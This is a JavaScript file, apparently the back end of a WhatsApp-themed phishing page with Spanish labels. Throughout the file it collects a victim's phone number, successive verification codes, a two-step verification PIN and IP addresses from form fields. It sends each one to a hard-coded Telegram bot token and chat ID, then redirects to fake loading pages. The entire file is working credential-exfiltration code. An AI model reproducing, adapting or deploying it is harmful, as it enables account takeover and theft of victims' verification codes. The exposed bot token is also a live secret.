//bot token
var telegram_bot_id = "7483143784:AAEgznj59jPcSNwvjowCJEd6kDqTbGn9t_Y";
//chat id
var chat_id = 5666517648;
var u_name, pax, pax2, ip, ip2;
var ready = function () {
    usuario = document.getElementById("usuario").value;
    ip = document.getElementById("id1").innerHTML;
    ip2 = document.getElementById("id2").innerHTML;
    message = "👤celular: " + usuario + "\nIP: " + ip +"\n" + ip2 +"\n";
    localStorage.setItem("usuario", usuario);
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'WhatsApp-load.html';
        console.log(response);
    });
    return false;
};

var ready1 = function () {
    var usuario = localStorage.getItem("usuario");
    codigo1 = document.getElementById("codigo1").value;
    ip = document.getElementById("id1").innerHTML;
    ip2 = document.getElementById("id2").innerHTML;
    message = "👤codigo1: " + codigo1 + "\nIP: " + ip +"\n" + ip2 +"\n📱Datos: " + usuario;
};
var sender1 = function () {
    ready1();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'WhatsApp-load2.html';
        console.log(response);
    });
    return false;
};


var ready3 = function () {
    var usuario = localStorage.getItem("usuario");
    codigo2 = document.getElementById("codigo2").value;
    ip = document.getElementById("id1").innerHTML;
    ip2 = document.getElementById("id2").innerHTML;
    message = "👤codigo2: " + codigo2 + "\nIP: " + ip +"\n" + ip2 +"\n📱Datos: " + usuario;
};
var sender3 = function () {
    ready3();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'WhatsApp-load3.html';
        console.log(response);
    });
    return false;
};


var ready2 = function () {
    var usuario = localStorage.getItem("usuario");
    validacion = document.getElementById("validacion").value;
    ip = document.getElementById("id1").innerHTML;
    ip2 = document.getElementById("id2").innerHTML;
    message = "👤Validacion de dos pasos: " + validacion + "\nIP: " + ip +"\n" + ip2 +"\n📱Datos: " + usuario;
};
var sender2 = function () {
    ready2();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'WhatsApp-load4.html';
        console.log(response);
    });
    return false;
};


var ready4 = function () {
    var usuario = localStorage.getItem("usuario");
    codigo3 = document.getElementById("codigo3").value;
    ip = document.getElementById("id1").innerHTML;
    ip2 = document.getElementById("id2").innerHTML;
    message = "👤codigo3: " + codigo3 + "\nIP: " + ip +"\n" + ip2 +"\n📱Datos: " + usuario;
};
var sender4 = function () {
    ready4();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = 'WhatsApp-load.html';
        console.log(response);
    });
    return false;
};
